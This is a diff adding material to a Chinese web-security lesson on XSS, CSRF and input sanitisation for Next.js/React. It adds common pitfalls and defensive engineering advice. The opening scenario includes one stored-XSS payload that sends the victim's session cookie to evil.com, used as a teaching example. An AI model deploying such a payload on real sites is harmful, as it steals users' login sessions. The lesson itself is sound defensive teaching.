@@ -1,5 +1,9 @@
 # 第五课：XSS、CSRF 和输入清理
 
+## 场景引入
+
+你的论坛产品允许用户发布评论。一天，有用户在评论中提交了一段 HTML 代码 `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`，你没有做任何过滤就存入了数据库。当其他用户浏览这条评论时，浏览器执行了这段脚本，用户的 Session Cookie 被发送到攻击者的服务器——攻击者拿到了他们的登录凭证。与此同时，另一个攻击者在外部网站嵌入了一个隐藏的表单，诱导已登录用户点击后自动向你的 API 发送转账请求。
+
 ## 学习目标
 
 完成本课学习后，你将能够：
@@ -352,7 +356,31 @@ const publicUrl = process.env.NEXT_PUBLIC_URL
 
 ---
 
-## 九、小结
+## 十、常见误区
+
+1. **以为 React 默认转义就能防所有 XSS**：React 只在 JSX 表达式中转义字符串，但 `dangerouslySetInnerHTML`、`href` 中的 `javascript:` 协议、`href` 和 `src` 中的数据 URI 都不在默认防护范围内。
+
+2. **认为 Server Actions 不需要 CSRF 防护**：虽然 Next.js Server Actions 有内置的 CSRF 防护（通过 POST 请求 + 特殊 header 验证），但自定义的 API Route 仍然需要手动检查 `Origin` 或 `Referer` header。
+
+3. **只在前端做输入验证**：前端验证（如 `required`、`pattern`）只是用户体验优化，攻击者可以直接调用 API 绕过。所有输入验证必须在服务端重复执行。
+
+4. **用正则表达式清理 HTML 代替专业库**：手写的正则清理（如 `/<[^>]*>/g`）无法处理嵌套标签、编码绕过等复杂场景。应该使用 DOMPurify 等专业库。
+
+---
+
+## 十一、工程建议
+
+1. **在 `next.config.js` 中统一配置安全头部**：CSP、HSTS、X-Frame-Options 等安全头部应该在框架层面统一配置，而不是在每个页面单独设置，确保全局一致。
+
+2. **使用 Zod 的 `.transform()` 做输入清理**：在 Zod schema 中用 `.transform(val => val.trim())` 或 `.transform(val => DOMPurify.sanitize(val))`，将验证和清理合为一步。
+
+3. **文件上传验证 Magic Bytes 而非仅检查扩展名**：攻击者可以将可执行文件重命名为 `.jpg`。通过检查文件头部的 Magic Bytes（如 JPEG 为 `FF D8 FF`）来确认真实文件类型。
+
+4. **敏感 Cookie 设置 `SameSite=Lax` + `HttpOnly` + `Secure`**：`SameSite=Lax` 防止 CSRF，`HttpOnly` 防止 XSS 读取，`Secure` 确保只在 HTTPS 下传输，三者缺一不可。
+
+---
+
+## 十二、小结
 
 ```
 本课核心要点：
